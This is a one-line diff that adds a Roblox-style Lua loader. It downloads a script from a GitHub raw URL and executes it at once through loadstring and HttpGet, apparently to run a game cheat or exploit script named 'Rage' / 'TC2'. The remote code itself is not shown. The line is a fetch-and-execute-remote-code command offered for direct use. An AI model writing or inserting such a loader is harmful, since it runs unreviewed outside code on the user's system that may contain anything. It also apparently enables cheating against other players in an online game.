@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Trashjpg/Rage/main/TC2.lua"))()
